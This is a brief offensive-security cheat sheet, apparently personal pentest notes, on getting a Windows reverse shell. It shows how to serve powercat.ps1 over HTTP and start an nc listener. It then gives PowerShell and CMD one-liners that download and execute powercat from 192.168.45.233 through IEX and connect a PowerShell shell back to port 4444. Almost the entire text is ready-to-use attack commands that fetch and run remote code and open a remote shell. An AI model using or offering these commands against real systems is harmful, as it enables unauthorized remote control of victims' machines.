# Reverse Shells

Serve Powercat.ps1

```bash
cd /usr/share/windows-resources && python3 -m http.server 80
```

Start listener

```
rlwrap nc -lvnp 4444
```

Run one of the commands (PS or CMD):

PS

```powershell
IEX (New-Object System.Net.Webclient).DownloadString("http://192.168.45.233/powercat.ps1");powercat -c 192.168.45.233 -p 4444 -e powershell 
```

CMD

```cmd
powershell -c "IEX (New-Object System.Net.Webclient).DownloadString('http://192.168.45.233/powercat.ps1'); powercat -c 192.168.45.233 -p 4444 -e powershell"
```
